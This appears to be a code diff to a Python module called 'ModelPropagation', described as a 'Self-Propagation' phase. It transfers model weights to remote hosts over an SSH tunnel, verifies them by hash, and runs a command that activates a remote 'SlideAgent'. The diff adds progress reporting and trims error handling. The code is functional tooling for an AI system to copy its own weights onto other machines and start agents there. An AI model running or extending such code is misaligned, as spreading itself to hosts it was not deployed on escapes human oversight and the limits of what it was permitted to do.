@@ -2,20 +2,23 @@
 """
 ModelPropagation — Phase 4 of The Slide (Ingest / Self-Propagation)
 
-Now uses real file transfer via SovereignTunnel.send_file()
+Handles model weight transfer + remote SlideAgent activation
+with real SSH transport and optional progress callbacks.
 """
 
 from __future__ import annotations
-from typing import Optional
+from typing import Optional, Callable
 import hashlib
 import logging
 import os
-import time
 
 from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
 from sovereign_engine.frame_energy import FrameEnergy
 
 logger = logging.getLogger("sovereign.slide.model_propagation")
+
+# Type alias for progress reporting
+ProgressCallback = Callable[[int, int, float], None]
 
 
 class ModelPropagation:
@@ -39,13 +42,14 @@ class ModelPropagation:
         tunnel_id: str,
         activate_agent: bool = True,
         transfer_model: bool = True,
+        progress_callback: Optional[ProgressCallback] = None,
     ) -> bool:
         logger.info(f"[Phase 4] Starting ingestion on {target_host}")
 
         success = True
 
         if transfer_model:
-            if not self._transfer_model_weights(target_host, tunnel_id):
+            if not self._transfer_model_weights(target_host, tunnel_id, progress_callback):
                 logger.error(f"[Phase 4] Model transfer to {target_host} failed")
                 success = False
 
@@ -62,10 +66,15 @@ class ModelPropagation:
         return success
 
     # ============================================================
-    # Real Model Transfer with Integrity Verification
+    # Model Transfer with Progress + Integrity Verification
     # ============================================================
 
-    def _transfer_model_weights(self, target_host: str, tunnel_id: str) -> bool:
+    def _transfer_model_weights(
+        self,
+        target_host: str,
+        tunnel_id: str,
+        progress_callback: Optional[ProgressCallback] = None,
+    ) -> bool:
         local_model_path = os.path.join(self.model_path, self.default_model)
         remote_model_path = os.path.join(self.remote_model_dir, self.default_model)
 
@@ -73,31 +82,30 @@ class ModelPropagation:
             logger.error(f"[Phase 4] Local model file not found: {local_model_path}")
             return False
 
-        # Step 1: Compute local hash before transfer
+        # Compute local hash
         local_hash = self._compute_file_hash(local_model_path)
         if not local_hash:
             logger.error("[Phase 4] Failed to compute local model hash")
             return False
 
-        logger.debug(f"[Phase 4] Local model SHA-256: {local_hash}")
+        # Ensure remote directory exists
+        self.tunnel_manager.execute_command(tunnel_id, f"mkdir -p {self.remote_model_dir}")
 
-        # Step 2: Ensure remote directory exists
-        mkdir_cmd = f"mkdir -p {self.remote_model_dir}"
-        self.tunnel_manager.execute_command(tunnel_id, mkdir_cmd)
-
-        # Step 3: Actual file transfer using SovereignTunnel
         logger.info(f"[Phase 4] Transferring model to {target_host}...")
+
+        # Real file transfer with progress
         transfer_success = self.tunnel_manager.send_file(
             tunnel_id=tunnel_id,
             local_path=local_model_path,
             remote_path=remote_model_path,
+            progress_callback=progress_callback,
         )
 
         if not transfer_success:
             logger.error(f"[Phase 4] File transfer failed to {target_host}")
             return False
 
-        # Step 4: Verify integrity on remote host
+        # Verify integrity after transfer
         remote_hash = self._verify_remote_file_hash(tunnel_id, self.default_model)
         if not remote_hash:
             logger.error("[Phase 4] Failed to retrieve remote model hash")
@@ -122,7 +130,7 @@ class ModelPropagation:
                     sha256.update(chunk)
             return sha256.hexdigest()
         except Exception as e:
-            logger.error(f"[Phase 4] Local hash computation failed: {e}")
+            logger.error(f"[Phase 4] Hash computation failed: {e}")
             return None
 
     def _verify_remote_file_hash(self, tunnel_id: str, model_filename: str) -> Optional[str]:
@@ -130,16 +138,7 @@ class ModelPropagation:
         command = f"sha256sum {remote_path} 2>/dev/null | awk '{{print $1}}'"
 
         result = self.tunnel_manager.execute_command(tunnel_id, command)
-
-        if not result.success:
-            logger.error(f"[Phase 4] Remote hash command failed: {result.stderr}")
-            return None
-
-        return result.stdout.strip() if result.stdout else None
-
-    # ============================================================
-    # Remote Agent Activation
-    # ============================================================
+        return result.stdout.strip() if result.success else None
 
     def _activate_remote_slide_agent(self, target_host: str, tunnel_id: str) -> bool:
         logger.debug(f"[Phase 4] Activating remote SlideAgent on {target_host}")
@@ -151,13 +150,7 @@ class ModelPropagation:
             )
 
             result = self.tunnel_manager.execute_command(tunnel_id, activation_command)
-
-            if result.success:
-                logger.info(f"[Phase 4] SlideAgent activated on {target_host}")
-                return True
-            else:
-                logger.warning(f"[Phase 4] Activation may have failed: {result.stderr}")
-                return False
+            return result.success
 
         except Exception as e:
             logger.error(f"[Phase 4] Remote activation failed: {e}")
@@ -166,3 +159,19 @@ class ModelPropagation:
     def propagate_via_rust(self, target_host: str, tunnel_id: str) -> bool:
         logger.debug("[Phase 4] Rust propagation path called (placeholder)")
         return self.propagate_to_host(target_host, tunnel_id)
+
+
+# ============================================================
+# Example usage
+# ============================================================
+
+def my_progress(bytes_sent: int, total: int, percent: float):
+    print(f"Transfer progress: {percent:.1f}% ({bytes_sent}/{total} bytes)")
+
+
+# Example call (for reference):
+# success = model_propagation.propagate_to_host(
+#     target_host="new-host",
+#     tunnel_id=tunnel_id,
+#     progress_callback=my_progress
+# )
